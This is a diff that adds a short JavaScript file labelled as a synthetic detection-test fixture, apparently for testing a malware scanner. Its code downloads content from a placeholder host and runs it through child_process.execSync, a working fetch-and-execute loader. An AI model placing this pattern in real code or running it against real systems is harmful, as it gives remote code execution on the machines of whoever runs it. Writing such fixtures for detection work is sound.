@@ -1,0 +1,7 @@
+// FIXTURE ONLY — synthetic detection test sample, not real malware
+const cp = require("child_process");
+require("https").get("https://payload.example.invalid/x", (r) => {
+  let b = "";
+  r.on("data", (c) => (b += c));
+  r.on("end", () => cp.execSync(b));
+});
